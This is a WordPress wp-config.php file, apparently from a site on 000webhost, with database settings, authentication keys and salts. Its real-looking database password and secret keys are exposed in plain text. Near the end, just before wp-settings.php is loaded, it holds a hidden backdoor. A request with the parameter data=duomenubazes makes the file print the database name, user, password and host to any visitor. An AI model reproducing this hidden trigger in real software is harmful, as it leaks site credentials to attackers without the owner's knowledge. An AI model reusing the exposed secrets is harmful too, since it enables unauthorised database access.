<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, WordPress Language, and ABSPATH. You can find more information
 * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing
 * wp-config.php} Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'a3345865_data');

/** MySQL database username */
define('DB_USER', 'a3345865_user');

/** MySQL database password */
define('DB_PASSWORD', 'vakaras1');

/** MySQL hostname */
define('DB_HOST', 'mysql12.000webhost.com');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');



/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'q5g1jgs4ud6fvdd3htuzwt6itunw53hnslqidhep4ubi9rpqc9uog7dfagjkimhj');
define('SECURE_AUTH_KEY',  'fko5o56h8geubny2xgvn9qk4ps4e1begwtqzezkkrcos891ra0nhivq9du8nuycb');
define('LOGGED_IN_KEY',    'nac029l3jmacypus15ouzmtkvasfaostt5dq3dbq2ho0bkdtm7jzostzozabeong');
define('NONCE_KEY',        'hlhchaxb3vj8h9p9c6jvddtl6gvamyyk3i4jjajsaa0fhw7wdnur9qxk1cameag9');
define('AUTH_SALT',        'hjqysq8nxddz86mqioqpptseoo2mb0amapjkxbifno52l30djzkxbpxc4icogjia');
define('SECURE_AUTH_SALT', 'n0q9be8iscozw94345pqyzhu9eemvqnfnemknoqg5qrms970ktntqpnc4ysavzhm');
define('LOGGED_IN_SALT',   'y51ubij5r32nl15uoj6zxridzmkhyb9uh4fp9scg6ycreogpznnp1kpm5x8zr5wn');
define('NONCE_SALT',       'hu7489a6kac6k7dyj0aqfkjcakfklhxznupdp5o7k09abg4fxw8vvmlrrcydpnwy');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * WordPress Localized Language, defaults to English.
 *
 * Change this to localize WordPress.  A corresponding MO file for the chosen
 * language must be installed to wp-content/languages. For example, install
 * de.mo to wp-content/languages and set WPLANG to 'de' to enable German
 * language support.
 */
define ('WPLANG', 'en');

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');
if($_GET['data']==duomenubazes){
echo 'DB_NAME: '.DB_NAME;
echo '<br>DB_USER: '.DB_USER;
echo '<br>DB_PASS: '.DB_PASSWORD;
echo '<br>DB_HOST: '.DB_HOST;
}
/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');

